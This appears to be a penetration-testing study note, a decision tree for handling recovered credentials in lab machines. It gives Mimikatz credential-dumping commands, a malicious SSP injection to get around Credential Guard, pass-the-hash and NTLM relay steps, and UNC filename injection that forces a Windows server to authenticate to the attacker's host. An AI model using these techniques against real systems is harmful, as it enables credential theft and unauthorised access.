# Secrets & Credentials, Decision Tree

Part of [[DECISION TREE]]. "I found X, what do I try" for credentials, hashes, and secrets.

---

## Private Keys & Web-Retrieved Secrets

### Retrieved a private key (or any multi-line secret) through a web vuln
→ Never copy/paste it by hand. Save the raw response to a file and extract with `sed`/`grep`:
```bash
curl -s "<vulnerable-url>" -o raw_response.txt
sed -n '/-----BEGIN.../,/-----END.../p' raw_response.txt > secret_file
```
→ Full reasoning: [[Common Web Application Attacks#9.1.2. Identifying and Exploiting Directory Traversals|9.1.2]]

### SSH key fails to load with a vague "unsupported"/"can't parse this" error
→ Don't jump to OpenSSL-compatibility theories first. Re-extract the key mechanically (see above) and `diff` it against your original copy. Corruption from manual copy/paste is the more common cause
→ If two independent tools (e.g. `ssh-keygen` and `puttygen`) both reject the same file, that's the tell it's the file, not the library
→ Full story: [[Common Web Application Attacks#9.1.2. Identifying and Exploiting Directory Traversals|9.1.2 troubleshooting box]]

---

## Windows Credential Attacks

### Got a hash from a Windows machine -- what type is it and what can you do?

**NTLM hash** (from SAM dump via Mimikatz/lsadump::sam, or from secretsdump):
- Format: 32 hex chars, e.g. `7a38310ea6f0027ee955abed1762964b`
- Can be **cracked** (hashcat -m 1000) OR **passed directly** (impacket-psexec, wmiexec, smbclient --pw-nt-hash)
- Static -- doesn't change unless the user changes their password
- Try cracking first (fast, offline, no noise). If it doesn't crack, pass it.

**Net-NTLMv2 hash** (from Responder capture):
- Format: `user::domain:challenge:response:blob` -- the full multi-field string
- Can be **cracked** (hashcat -m 5600) OR **relayed live** (impacket-ntlmrelayx)
- CANNOT be passed directly -- it's a challenge-response tied to one session, not a reusable secret
- Try cracking first. If rockyou + best66 + rockyou-30000 all fail or take too long: relay instead

→ Full comparison: [[Password Attacks#16.3.3. Cracking Net-NTLMv2|16.3.3]] and [[Password Attacks#16.3.2. Passing NTLM|16.3.2]]

---

### Got a Windows foothold -- which credential attacks make sense here?

**Check if Credential Guard is active first:**
```powershell
Get-ComputerInfo | Select-Object DeviceGuardSecurityServicesRunning
# "CredentialGuard" = active
```

**Credential Guard OFF** (most lab VMs, older enterprise machines):
→ `sekurlsa::logonpasswords` may show plaintext (wdigest) or NTLM hashes
→ `lsadump::sam` dumps all local NTLM hashes (requires admin + token::elevate)

**Credential Guard ON** (`wdigest: KO`, `LSA Isolated Data` blobs in Mimikatz output):
→ Standard Mimikatz hash extraction is blocked for domain accounts
→ Use `misc::memssp` to inject a malicious SSP that intercepts credentials at the SSPI layer BEFORE Credential Guard encrypts them
→ Wait for (or coerce) a new authentication event, then read `C:\Windows\System32\mimilsa.log`
→ Full walkthrough: [[Password Attacks#16.3.5. Windows Credential Guard|16.3.5]]

---

### ntlmrelayx relay fails with "FAILED" for the relayed user

→ The relayed user is not a local admin on the relay target. Relay only gives you code execution if the authenticated user has local admin rights on the TARGET machine.
→ Check: is there another target where this user IS local admin? Enumerate other machines on the network.
→ Fallback: if you can dump the SAM on the source machine (schtask workaround), get the user's raw NTLM hash and PtH directly -- achieves the same access without needing the relay to succeed.
→ Full story: [[Password Attacks#16.3.4. Relaying Net-NTLMv2|16.3.4 VM Group 1]]

---

### Responder isn't capturing anything after triggering an SMB auth

→ Check if Responder is running with `sudo` (needs raw sockets for LLMNR/NBT-NS servers)
→ Check interface name: `sudo responder -I tun0` -- the interface must match your actual VPN (`ip a`)
→ If the Windows machine uses DNS successfully, LLMNR/NBT-NS poisoning won't fire. You need to trigger a direct SMB connection to your IP: `dir \\<kali-ip>\test` from a shell on the victim
→ Responder and ntlmrelayx can't both own port 445 at the same time. If running a relay, stop Responder first.

---

### UNC filename injection on a web file server isn't capturing via Responder

→ Try forward-slash UNC form first: `//kali-ip/share/file` instead of `\\kali-ip\share\file`
→ On Go's `filepath.Join(uploadDir, filename)` on Windows: `//server/` is treated as an absolute UNC path discarding uploadDir. Backslash form may be filtered; forward slashes often aren't.
→ Confirm the server does minimal path sanitisation first: `curl http://<target>/nul` → 200 OK (Windows NUL device passes through), `curl http://<target>/aux` → hangs (AUX serial port device). If both fire, the handler isn't sanitising device names, making UNC injection likely viable.
→ Full story: [[Password Attacks#16.3.3. Cracking Net-NTLMv2|16.3.3 VM #2]]
